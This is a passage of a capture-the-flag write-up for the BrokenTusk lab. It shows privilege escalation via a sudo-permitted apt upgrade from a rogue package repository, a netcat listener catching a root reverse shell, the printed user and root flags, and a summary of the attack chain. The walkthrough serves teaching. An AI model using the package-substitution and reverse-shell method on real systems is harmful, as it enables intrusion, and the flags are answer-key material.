Ign:4 http://package.brokentusk.nyx/debian trixie/main all Packages                                         
Ign:5 http://package.brokentusk.nyx/debian trixie/main Translation-en                                       
Ign:6 http://package.brokentusk.nyx/debian trixie/main Translation-en_US                                    
Ign:3 http://package.brokentusk.nyx/debian trixie/main amd64 Packages                                       
Ign:4 http://package.brokentusk.nyx/debian trixie/main all Packages                                                               
Ign:5 http://package.brokentusk.nyx/debian trixie/main Translation-en                                                             
Ign:6 http://package.brokentusk.nyx/debian trixie/main Translation-en_US                                    
Get:3 http://package.brokentusk.nyx/debian trixie/main amd64 Packages [557 B]                               
Ign:4 http://package.brokentusk.nyx/debian trixie/main all Packages                                                                   
Ign:5 http://package.brokentusk.nyx/debian trixie/main Translation-en                                       
Ign:6 http://package.brokentusk.nyx/debian trixie/main Translation-en_US                                                                                 
Ign:4 http://package.brokentusk.nyx/debian trixie/main all Packages                                                                     
Ign:5 http://package.brokentusk.nyx/debian trixie/main Translation-en                            
Ign:6 http://package.brokentusk.nyx/debian trixie/main Translation-en_US              
Ign:4 http://package.brokentusk.nyx/debian trixie/main all Packages                              
Ign:5 http://package.brokentusk.nyx/debian trixie/main Translation-en
Ign:6 http://package.brokentusk.nyx/debian trixie/main Translation-en_US                         
Ign:4 http://package.brokentusk.nyx/debian trixie/main all Packages                              
Ign:5 http://package.brokentusk.nyx/debian trixie/main Translation-en                            
Ign:6 http://package.brokentusk.nyx/debian trixie/main Translation-en_US
Fetched 557 B in 9s (62 B/s)                                                                                                                                                                                                               
Reading package lists... Done

zer0arc4@BrokenTusk:~$ 
```

The important part of the output is:

```text
Get:3 http://package.brokentusk.nyx/debian trixie/main amd64 Packages [557 B]
```

The custom repository's package index is successfully retrieved.


## 6. Upgrade the Package

Now execute:

```bash
sudo apt-get upgrade
```

The target identifies `nano` as an available upgrade.

### Relevant output:

```text
zer0arc4@BrokenTusk:~$ sudo apt-get upgrade 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  nano
1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 645 kB of archives.
After this operation, 0 B of additional disk space will be used.
Do you want to continue? [Y/n]
```

APT requests confirmation:

```text
Do you want to continue? [Y/n] y
```

After confirmation, the package is downloaded and installed.

```text
zer0arc4@BrokenTusk:~$ sudo apt-get upgrade 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
The following package was automatically installed and is no longer required:
  linux-image-6.12.94+deb13-amd64
Use 'sudo apt autoremove' to remove it.
The following packages will be upgraded:
  nano
1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 645 kB of archives.
After this operation, 0 B of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://package.brokentusk.nyx/debian trixie/main amd64 nano amd64 8.5-1+deb13u2 [645 kB]
Fetched 645 kB in 0s (3,403 kB/s)
Reading changelogs... Done
(Reading database ... 48461 files and directories currently installed.)
Preparing to unpack .../nano_8.5-1+deb13u2_amd64.deb ...
Unpacking nano (8.5-1+deb13u2) over (8.4-1+deb13u1) ...
Setting up nano (8.5-1+deb13u2) ...
```

The package installation triggers the post-installation script.

---

# 🏴 Root Access Obtained

Check the Netcat listener on the attacking machine.

## Reverse shell:

```text
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.121] 38728
root@BrokenTusk:/# id ;hostname
id ;hostname
uid=0(root) gid=0(root) groups=0(root)
BrokenTusk
root@BrokenTusk:/#
```

<badge> Root access obtained </badge>

We have successfully escalated from `zer0arc4` to `root` using the APT package upgrade mechanism.

---

# 🚩 Flag Collection

## User Flag

```bash
cat /home/zer0arc4/user.txt
```

**User flag:**

```text
9346e4474996a9ba8cc5248f4e5051c5
```

## Root Flag

```bash
cat /root/root.txt
```

**Root flag:**

```text
65742587f1d6944b0ed55f6c1d311e21
```


---

# 🧠 Key Takeaways

1. **Thorough Web Enumeration:** Directory and parameter fuzzing revealed the `vuln.php` endpoint and its `page` parameter.
2. **LFI Investigation:** Reading `/etc/passwd` exposed the local user accounts and provided useful information for subsequent enumeration.
3. **PHP Vulnerability Research:** Investigating the disclosed PHP version led to the PHP2Shell exploit chain used to obtain initial access.
4. **Binary Analysis:** The `passgoblin` executable contained a Base64-encoded secret key that unlocked stored credentials.
5. **Credential Reuse:** The recovered credentials provided SSH access as `zer0arc4`.
6. **Sudo Misconfiguration:** Passwordless access to APT update and upgrade commands created the final privilege escalation opportunity.
7. **APT Repository Security:** An untrusted repository and insecure package-delivery configuration can expose a system to package substitution attacks.

---


## **Author:** [zer0arc4](https://github.com/zer0arc4)
